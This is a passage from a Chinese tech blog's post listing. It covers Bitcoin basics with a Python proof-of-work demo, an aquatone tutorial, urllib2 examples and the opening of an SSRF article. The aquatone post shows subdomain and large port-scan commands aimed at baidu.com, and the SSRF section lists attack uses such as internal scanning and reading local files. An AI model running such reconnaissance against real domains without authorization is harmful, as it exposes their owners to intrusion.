+<p>矿机之间通过商定的协议使得所有矿机的帐本是一模一样的<br>一个去中性化的货币模式就这样形成了</p>
+<h1 id="比特币知识（三）"><a href="#比特币知识（三）" class="headerlink" title="比特币知识（三）"></a>比特币知识（三）</h1><p><a href="http://blog.yuccn.net/archives/82.html" target="_blank" rel="noopener">http://blog.yuccn.net/archives/82.html</a><br>比特币总量为2100万，是固定数量的。</p>
+<p>比特币最小单位是聪（satoshis），一个比特币 等于 一亿个聪，1BTC=10的8次方</p>
+<p><img src="https://s1.ax1x.com/2018/05/14/CrUct0.png" alt></p>
+<p>比特币总数计算代码实现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!usr&#x2F;bin&#x2F;python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">startbtc&#x3D;50		#初始一个区块产生的比特币</span><br><span class="line">block&#x3D;210000	#每210000个区块产生后，比特币减半</span><br><span class="line"></span><br><span class="line">btc&#x3D;startbtc* 10**8	#最初一个区块产生的50个比特币，单位satoshis</span><br><span class="line">total&#x3D;0			#最终总的btc</span><br><span class="line">while btc&gt;0:</span><br><span class="line">	total&#x3D;total+block*btc</span><br><span class="line">	btc&#x3D;btc&#x2F;2</span><br><span class="line">total&#x3D;total&#x2F;(10**8)</span><br><span class="line">print u&quot;Total BTC: %d 个&quot;%total</span><br></pre></td></tr></table></figure>
+
+<p>执行结果<br>python btctest.py<br>Total BTC: 20999999 个</p>
+<h1 id="比特币知识（四）"><a href="#比特币知识（四）" class="headerlink" title="比特币知识（四）"></a>比特币知识（四）</h1><p><a href="http://blog.yuccn.net/archives/95.html" target="_blank" rel="noopener">http://blog.yuccn.net/archives/95.html</a><br>比特币特点：</p>
+<p>1、去中心化： 货币由中心发行和管理（类似今天的中央银行）<br>2、匿名性，专属拥有： 比特币系统记账是匿名的， 比特币账号本质是一个地址，没有记录拥有者的任何信息<br>专属拥有性: 有比特币地址（密码学上的公钥），私密的密码（密码学上的私钥），才能真正拥有该账号且可以使用<br>3、世界范围内流通：直接转账，无手续费，汇率差等。</p>
+<h1 id="比特币知识（五）"><a href="#比特币知识（五）" class="headerlink" title="比特币知识（五）"></a>比特币知识（五）</h1><p><a href="http://blog.yuccn.net/archives/209.html#comment-76" target="_blank" rel="noopener">http://blog.yuccn.net/archives/209.html#comment-76</a></p>
+<p>矿机、挖矿什么、矿池<br>矿机： 不停挖矿的机器，也就是电脑<br>矿池：一堆矿机 (一起挖矿，平分一起挖到的矿)</p>
+<p>比特币交易的数据是分布式存储记录的。</p>
+<p>挖矿的本质类似之前的记账<br>把一段时间内的交易打包在一起（一个区块）<br>然后获得比特币</p>
+<p>挖矿报酬–比特币来源：<br>（1）系统生成，每生成一个区块就会生成一定的比特币奖励给矿工（记账），生成的比特币会越来越少。<br>（2）交易手续费，比特币交易中，拿出一些费用作为手续费。</p>
+<p>挖矿本质就是记账，把一对账目（即交易）打包在一起，就是一个区块。</p>
+<p>区块里有很多交易条目<br>同时带有：<br>（1）hash<br>（2）时间戳<br>（3）索引号<br>（4）上一块数据的hash<br>（5）随机数等<br>（6）…<br><img src="https://s1.ax1x.com/2018/05/14/CrUbh6.md.png" alt></p>
+<p>记账权-由工作量证明（Proof Of Work，简称POW）来决定</p>
+<p>做一道数学题，谁先算出，打包权和奖励金就归谁（挖到矿了）</p>
+<p>每个区块里有个信息记录摘要值hash以及随机数nonce (Number once)</p>
+<p>计算过程：需要算出一个nonce,使得整个区块的hash值前面有n个0 (n称为计算难度)</p>
+<p><img src="https://s1.ax1x.com/2018/05/14/CrUHtx.md.png" alt></p>
+<p>例子，数据为hello china. 计算难度为3<br>使得 “hello china.nonce” 的哈希值格式为：<br>“000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx”，前面三个要求为0。</p>
+<p>sha256(“hello china.0”) = “72442cbab482ac912ab04a4d735ca13afad5d47970649fd4683775cb6080cd4f”<br>sha256(“hello china.1”) = “25d64131521b3c83d27c3cae53ef79e573bc27e3658566c25c33bffe8ba588a7”<br>sha256(“hello china.2”) = “bc79953d627fc9de365ed26018d663bafdf8c6c02e236d11816f94eecb484b0f”<br>……<br>sha256(“hello china.2346”) = “000b6d006b4e31d9837f446dca65ebfb7246196cb00e6ee404cf243e73eef413”</p>
+<p>nonce=2346时，满足了要求。如果n较大，这个求值计算量是非常庞大的。</p>
+<p>区块链的不可修改性<br>后一个区块有前一个区块的hash, 所以要改变得改变全部。</p>
+<p>计算获取随机数的时间，代码实现（示例）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">#!usr&#x2F;bin&#x2F;python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import hashlib</span><br><span class="line">import time</span><br><span class="line">import sys </span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">#BTC包含的数据</span><br><span class="line">index</span><br><span class="line">previous_hash </span><br><span class="line">timestamp</span><br><span class="line">hash</span><br><span class="line">transaction </span><br><span class="line">nonce</span><br><span class="line"></span><br><span class="line">data&#x3D;index+previous_hash+timestamp+transaction+nonce  #对该数据进行sha256加密</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">def get_hash(data):		#对data加密</span><br><span class="line">	result&#x3D;hashlib.sha256()</span><br><span class="line">	result.update(data)</span><br><span class="line">	return result.hexdigest()	#返回加密串</span><br><span class="line">	</span><br><span class="line">def get_nonce(hash,n):		#n表示计算难度,这里判断hash前n位是否为0</span><br><span class="line">	for i in range(0,n):</span><br><span class="line">		if hash[i]!&#x3D;&#39;0&#39;:	#hash值从0到n,如果有不为0的则返回False</span><br><span class="line">			return False</span><br><span class="line">	return True</span><br><span class="line">	</span><br><span class="line">def hash_calculate(index,previous_hash,timestamp,transaction,n):#n表示计算难度</span><br><span class="line">	hash&#x3D;&quot;&quot;		#初始化</span><br><span class="line">	nonce&#x3D;0		#初始随机数</span><br><span class="line">	while True:</span><br><span class="line">		data&#x3D;str(index)+previous_hash+timestamp+transaction+str(nonce)</span><br><span class="line">		hash&#x3D;get_hash(data)		#计算hash</span><br><span class="line">		if get_nonce(hash,n):	#获取hash值前n位为0</span><br><span class="line">			return hash,nonce	#计算成功返回hash值和随机数nonce </span><br><span class="line">		nonce&#x3D;nonce+1		</span><br><span class="line">	</span><br><span class="line">def blockchain(index,previous_hash,timestamp,transaction,hash,nonce):</span><br><span class="line">	print &quot;-----------------------------------------------------&quot;</span><br><span class="line">	print u&quot;第%s个区块信息:&quot; % str(index)</span><br><span class="line">	print u&quot;区块index: %s&quot; % str(index)</span><br><span class="line">	print u&quot;区块previous_hash: %s&quot; % previous_hash</span><br><span class="line">	print u&quot;区块timestamp: %s&quot; % timestamp</span><br><span class="line">	print u&quot;区块transaction: %s &quot; % transaction</span><br><span class="line">	print u&quot;区块hash: %s&quot; % hash</span><br><span class="line">	print u&quot;区块nonce: %d&quot; % nonce</span><br><span class="line">		</span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">	n&#x3D;int(sys.argv[1])		#传入计算难度</span><br><span class="line">	#print n</span><br><span class="line">	#data&#x3D;&quot;admin&quot;</span><br><span class="line">	#print get_hash(data)</span><br><span class="line">	#print get_nonce(get_hash(data),n)</span><br><span class="line">	block_transaction&#x3D;[&quot;test1&quot;,&quot;test2&quot;,&quot;test3&quot;,&quot;test4&quot;]		#区块交易数据(transaction)</span><br><span class="line">	#index&#x3D;0</span><br><span class="line">	previous_hash&#x3D;&quot;&quot;	#创世块，previous_hash为空</span><br><span class="line">	nowtime&#x3D;time.time()	#获取当前时间戳</span><br><span class="line">	for i in range(0,len(block_transaction)):</span><br><span class="line">		#获取指定格式的时间</span><br><span class="line">		timenow&#x3D;time.localtime(nowtime)	#获取当前时间，年月日时分秒格式</span><br><span class="line">		thetime&#x3D;time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;,timenow) #指定时间格式</span><br><span class="line">		#print thetime</span><br><span class="line">		hash,nonce&#x3D;hash_calculate(i,previous_hash,thetime,block_transaction[i],n+i)#后面每个区块难度加1</span><br><span class="line">		#print hash</span><br><span class="line">		#print nonce</span><br><span class="line">		blockchain(i,previous_hash,thetime,block_transaction[i],hash,nonce)</span><br><span class="line">		print u&quot;计算nonce耗时:%d 毫秒&quot;% ((time.time()-nowtime)*1000)	#获取计算时间</span><br><span class="line">		print &quot;-----------------------------------------------------&quot;</span><br><span class="line">		previous_hash&#x3D;hash</span><br><span class="line">		nonce&#x3D;0</span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://s1.ax1x.com/2018/05/14/CrU6kq.md.png" alt></p>
+<h1 id="比特币知识（六）"><a href="#比特币知识（六）" class="headerlink" title="比特币知识（六）"></a>比特币知识（六）</h1><p><a href="http://blog.yuccn.net/archives/316.html" target="_blank" rel="noopener">http://blog.yuccn.net/archives/316.html</a></p>
+<p>从下载大文件说起<br>如文件只在一个服务器上存在，下载源有一个<br><img src="https://s1.ax1x.com/2018/05/15/CsZQRP.png" alt></p>
+<p>缺点：<br>下载用户过多：服务器压力过大<br>下载异常断开：则需要重新下载<br>服务器异常关机：无法下载</p>
+<p>多个资源节点下载大文件<br><img src="https://s1.ax1x.com/2018/05/15/CsZ3M8.png" alt></p>
+<p>不同的节点下载各块的时候，涉及一个校验块是否正确的问题。<br>如何确保下载的每一块的数据是正确的（下载出错或者服务器伪造假数据）</p>
+<p>解决校验问题，采用hash list<br><img src="https://s1.ax1x.com/2018/05/15/CsZ8sS.png" alt></p>
+<p>hash list存在着不足，所以促使了Merkle Tree 结构的诞生。<br><img src="https://s1.ax1x.com/2018/05/15/CsZGqg.md.png" alt></p>
+<p>hash list： 需要下载整个list才能校验<br>Mercle Tree: 只需下载其对应的分支就可以做校验，确保Root hash从可信机器下载。</p>
+<p>前面提到，每个区块内的数据有previous hash, nonce,timestamp,hash和transaction<br>其实，在区块里是不包含transaction的<br>它包含的数据就是这个区块内的交易生成的一个Merkle Tree的那个Root hash 节点。<br><img src="https://s1.ax1x.com/2018/05/15/CsZtaj.md.png" alt></p>
+<p>这样做的好处是可以仅下载区块头<br>不需要下载整个区块下的每一笔交易及其每一个区块（数据量很大），简化支付验证（SPV）</p>
+<p>一个轻客户端希望确定一笔交易的状态：</p>
+<p>（1）从网络上获取并保存最长链的所有区块头信息<br>（2）计算该交易的hash值（tx_hash）<br>（3）定位到包含该tx_hash所在的区块，验证其区块头是否包含在已知的最长链中。<br>（4）从区块中获取构建Merkle Tree所需的hash值<br>（5）根据这些hash值计算出Merkle Tree 的root hash<br>（6）若计算结果与区块头中的Merkle Tree 的root hash相等，则交易真实存在。</p>
+<h1 id="比特币知识（七）"><a href="#比特币知识（七）" class="headerlink" title="比特币知识（七）"></a>比特币知识（七）</h1><p><a href="http://blog.yuccn.net/archives/459.html" target="_blank" rel="noopener">http://blog.yuccn.net/archives/459.html</a></p>
+<p>矿机每成功生产一个区块，就会获得一定量的比特币<br>这些比特币:<br>（1）一部分来自交易的手续费<br>（2）另外一部分是按照算法共识生成的<br>比特币不是某个系统或者机构发行的！！！</p>
+<p>以下是一个完整的区块信息，包含区块头和区块体。<br>区块体：矿机记录交易的的内容。<br><img src="https://s1.ax1x.com/2018/05/15/CsZNIs.md.png" alt></p>
+<p>看实例<br>区块209999<br><a href="https://btc.com/00000000000000f3819164645360294b5dee7f2e846001ac9f41a70b7a9a3de1" target="_blank" rel="noopener">https://btc.com/00000000000000f3819164645360294b5dee7f2e846001ac9f41a70b7a9a3de1</a></p>
+<p><img src="https://s1.ax1x.com/2018/05/15/CsZrsU.png" alt></p>
+<p>跟别的交易不一样，该交易左边输出为coinbase<br>输出方：比特币系统（造币）<br>比特币系统：所有矿机连接起来组成一个网络，正在挖矿的矿机都是整个系统的一部分。</p>
+<p>矿机挖矿：本质是在争夺记录交易，并且计算符合要求的hash。<br>除了第一条交易之外，其他的都是真真正正的交易。（A转了多少coin给B）</p>
+<p>而第一条交易记录就是这样的一个记录了，它按照共识约定的算法，<br>自己写上一定数量比特币，并且把它写着归属自己的钱包地址。<br>可以这样理解，所有矿机在计算hash 前，都会写上第一条交易记录：<br>coinbase “转账”了n 个比特币给自己，<br>第二条开始记录的才是监听到的真正交易列表。只有在自己最先计算出合要求的hash，<br>并且把区块信息广播出去，达到一定数量的矿机确认了，这个区块才算有效，<br>这个时候，这个“转账”的比特币才真正属于自己的。</p>
+<p>比特币如何发行的：矿机找到一个合法的区块的时候，自己给自己“发行”了比特币（即第一个交易）<br>这就是比特币系统发行比特币的过程。</p>
+<h1 id="比特币知识（八）"><a href="#比特币知识（八）" class="headerlink" title="比特币知识（八）"></a>比特币知识（八）</h1><p><a href="http://blog.yuccn.net/archives/576.html" target="_blank" rel="noopener">http://blog.yuccn.net/archives/576.html</a></p>
+<p>在比特币系统中，矿机在不断的挖矿—记账。<br>矿机集体挖矿特点：总体上挖矿 出区块的时间大致是均匀的，平均10分钟挖出一个区块。</p>
+<p>比特币系统通过控制难度系数（hash前面有n个0，这个n值），来动态调整使得均匀区块的。</p>
+<p>矿机集体挖矿，会达成一个共识：<br>每产生2016个区块，会统计这2016个区块的平均出块时间。<br>如果</p>
+<p>平均时间&lt; 期望时间：矿机们会增大难度系数<br>平均时间&gt; 期望时间 : 矿机们会减小难度系数</p>
+<p>动态调整难度系数！！！ 使出块平均值尽量接近10分钟。</p>
+<p>比特币系统（矿机们）就是按照这样达成的共识算法<br>每产生2016个区块，就调整一次出块难度系数，使得总体上接近均匀出块。</p>
+<p>2016*10=20160分钟=14天=2周</p>
+<p>因此有比特币系统每两周进行一次难度系数调整。（其实是约等于2周进行一次难度系数调整）</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.yi-diandian.com/2020/04/06/btc/" data-id="ck8nvek8b0001d8h508fs797p" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E7%89%B9%E5%B8%81/" rel="tag">比特币</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-aquatone" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/06/aquatone/" class="article-date">
+  <time datetime="2020-04-06T02:28:14.205Z" itemprop="datePublished">2020-04-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/06/aquatone/">子域名扫描工具aquatone</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h1><p><a href="https://github.com/michenriksen/aquatone" target="_blank" rel="noopener">https://github.com/michenriksen/aquatone</a></p>
+<p>参考freebuf上翻译的一篇文章</p>
+<p><a href="http://www.freebuf.com/sectool/137806.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/137806.html</a></p>
+<h1 id="具体使用"><a href="#具体使用" class="headerlink" title="具体使用"></a>具体使用</h1><p>系统：kali linux</p>
+<h1 id="扫描子域名"><a href="#扫描子域名" class="headerlink" title="扫描子域名:"></a>扫描子域名:</h1><p>aquatone-discover -d baidu.com</p>
+<h1 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口:"></a>扫描端口:</h1><p>aquatone-scan -p huge -d baidu.com</p>
+<p>其中:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">**small:** 80, 443</span><br><span class="line">**medium:** 80, 443, 8000, 8080, 8443 (same as default)</span><br><span class="line">**large: **80, 81, 443, 591, 2082, 2095, 2096, 3000, 8000, 8001, 8008, 8080, 8083, 8443, 8834, 8888, 55672</span><br><span class="line">**huge: **80, 81, 300, 443, 591, 593, 832, 981, 1010, 1311, 2082, 2095, 2096, 2480, 3000, 3128, 3333, 4243, 4567, 4711, 4712, 4993, 5000, 5104, 5108, 5280, 5281, 5800, 6543, 7000, 7396, 7474, 8000, 8001, 8008, 8014, 8042, 8069, 8080, 8081, 8083, 8088, 8090, 8091, 8118, 8123, 8172, 8222, 8243, 8280, 8281, 8333, 8337, 8443, 8500, 8834, 8880, 8888, 8983, 9000, 9043, 9060, 9080, 9090, 9091, 9200, 9443, 9800, 9981, 11371, 12443, 16080, 18091, 18092, 20720, 55672</span><br></pre></td></tr></table></figure>
+<p>效果还是很好的。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.yi-diandian.com/2020/04/06/aquatone/" data-id="ck8nvek7t0000d8h5g32b0o2m" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/aquatone/" rel="tag">aquatone</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-third" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/06/third/" class="article-date">
+  <time datetime="2020-04-06T02:28:13.787Z" itemprop="datePublished">2020-04-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/06/third/">信息安全领域</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>总结得蛮好蛮全面，供参考。</p>
+<p><img src="https://s1.ax1x.com/2018/02/27/9BCsd1.png" alt></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.yi-diandian.com/2020/04/06/third/" data-id="ck8nvek9k001vd8h54yudg2yv" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag">信息安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-urllib2" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/06/urllib2/" class="article-date">
+  <time datetime="2020-04-06T02:28:13.787Z" itemprop="datePublished">2020-04-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/06/urllib2/">Python urllib2的使用</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>urllib2获取网页三种方法。参考链接<a href="https://www.imooc.com/video/10682/0" target="_blank" rel="noopener">https://www.imooc.com/video/10682/0</a></p>
+<h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><p>response = urllib2.urlopen(url)<br>print response.getcode() 返回200<br>print response.code 返回200<br>print response.read() 读取内容</p>
+<h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>需要提交的三个值<br>url data header<br>request = urllib2.Request(url)<br>然后仍然使用urllib2.urlopen(request)</p>
+<p>实际代码<br>request = urllib2.Request(url)<br>request.add_data(‘a’,’1’)<br>request.add_header(‘User-Agent’,’Mozilla/5.0’)<br>然后response = urllib2.urlopen(request)</p>
+<p>解决python2.7传一个参数的错误</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">#-*- coding:UTF-8 -*-</span><br><span class="line">import urllib2</span><br><span class="line">import urllib</span><br><span class="line">url &#x3D; &quot;https:&#x2F;&#x2F;www.baidu.com&quot;</span><br><span class="line">request &#x3D; urllib2.Request(url)</span><br><span class="line">values &#x3D; &#123;&#39;wd&#39;:&#39;python&#39;&#125;</span><br><span class="line">data &#x3D; urllib.urlencode(values)</span><br><span class="line">request.add_data(data)</span><br><span class="line">request.add_header(&#39;User-Agent&#39;,&#39;Mozilla&#x2F;5.0&#39;)</span><br><span class="line">response &#x3D; urllib2.urlopen(request)</span><br><span class="line"></span><br><span class="line">print response.read()</span><br></pre></td></tr></table></figure>
+<p>实际请求的url:<br><a href="https://www.baidu.com/?wd=python" target="_blank" rel="noopener">https://www.baidu.com/?wd=python</a></p>
+<h1 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h1><p>特殊情景处理</p>
+<p>代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">#-*- coding:UTF-8 -*-</span><br><span class="line">import urllib2,cookielib</span><br><span class="line">#创建cookie容器</span><br><span class="line">cookie &#x3D; cookielib.CookieJar()</span><br><span class="line">#创建opener</span><br><span class="line">opener &#x3D; urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">urllib2安装opener</span><br><span class="line">urllib2.install_opener(opener)</span><br><span class="line">response &#x3D; urllib2.urlopen(&quot;http:&#x2F;&#x2F;www.freebuf.com&quot;)</span><br><span class="line">print response.code    #返回200</span><br><span class="line">完整代码</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">#-*- coding:UTF-8 -*-</span><br><span class="line">import urllib2</span><br><span class="line">import cookielib</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;www.baidu.com&quot;</span><br><span class="line">print &quot;方法1&quot;</span><br><span class="line">response1 &#x3D; urllib2.urlopen(url)</span><br><span class="line">print response1.getcode()</span><br><span class="line">print len(response1.read())</span><br><span class="line"></span><br><span class="line">print &quot;方法2&quot;</span><br><span class="line">request &#x3D; urllib2.Request(url)</span><br><span class="line">request.add_header(&quot;User-Agent&quot;,&quot;Mozilla&#x2F;5.0&quot;)</span><br><span class="line">response2 &#x3D; urllib2.urlopen(request)</span><br><span class="line">print response2.getcode()</span><br><span class="line">print len(response2.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;方法3&quot;</span><br><span class="line">cj &#x3D; cookielib.CookieJar()</span><br><span class="line">opener &#x3D; urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))</span><br><span class="line">urllib2.install_opener(opener)</span><br><span class="line">response3 &#x3D; urllib2.urlopen(url)</span><br><span class="line">print response3.getcode()</span><br><span class="line">print cj					#打印cookie</span><br><span class="line"># print len(response3.read())</span><br></pre></td></tr></table></figure>
+
+<h1 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h1><p>方法1<br>200<br>114834<br>方法2<br>200<br>115620<br>方法3<br>200<br>&lt;CookieJar[&lt;Cookie BAIDUID=DD71007B0D5B5B29E8332283D1903638:FG=1 for .baidu.com/&gt;, &lt;Cookie BIDUPSID=DD71007B0D5B5B29E8332283D1903638 for .baidu.com/&gt;, &lt;Cookie H_PS_PSSID=1431_2112<br>114903</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.yi-diandian.com/2020/04/06/urllib2/" data-id="ck8nvek9m0021d8h576ptfv0g" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/urllib2/" rel="tag">urllib2</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-ssrf" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/06/ssrf/" class="article-date">
+  <time datetime="2020-04-06T02:28:13.785Z" itemprop="datePublished">2020-04-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/06/ssrf/">SSRF漏洞的检测及防御</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="1-SSRF简介"><a href="#1-SSRF简介" class="headerlink" title="1.SSRF简介"></a>1.SSRF简介</h1><h2 id="1-漏洞名称："><a href="#1-漏洞名称：" class="headerlink" title="(1)漏洞名称："></a>(1)漏洞名称：</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)</p>
+<h2 id="2-漏洞描述："><a href="#2-漏洞描述：" class="headerlink" title="(2)漏洞描述："></a>(2)漏洞描述：</h2><p>SSRF 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。<br>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页    文本内容、加载指定地址的图片、下载等。</p>
+<ul>
+<li>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</li>
+<li>2.攻击运行在内网或本地的应用程序(比如溢出)。</li>
+<li>3.对内网web应用进行指纹识别，通过访问默认文件实现。</li>
+<li>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击(比    如struts2，sqli等)。</li>
+<li>5.利用file协议读取本地文件等。</li>
+</ul>
+<h2 id="3-风险等级："><a href="#3-风险等级：" class="headerlink" title="(3)风险等级："></a>(3)风险等级：</h2><p>高危</p>
